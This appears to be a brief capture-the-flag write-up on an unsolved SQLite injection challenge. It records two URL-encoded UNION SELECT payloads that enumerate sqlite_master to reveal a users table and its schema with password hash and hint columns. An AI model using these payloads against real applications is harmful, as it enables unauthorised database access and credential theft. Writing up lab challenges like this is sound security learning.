### This is a very cool challenge, I didn't solve it (nearly), but, nah, just write down to remember stuff
This is a SQLite injection, how do I know it was SQLite, well fuzzing and sqlmap

So the syntax of the payload is the same but the way to extract is different:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md

With this I get the table name is users:
%22 UNION SELECT tbl_name,2 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' -- -

And with this I get the column name:
%22 UNION SELECT 1,sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='users' -- -
```
CREATE TABLE users (
	username text primary key not null,
	password_hash text not null,
	hint text not null,
	bio text not null)
  ```
  
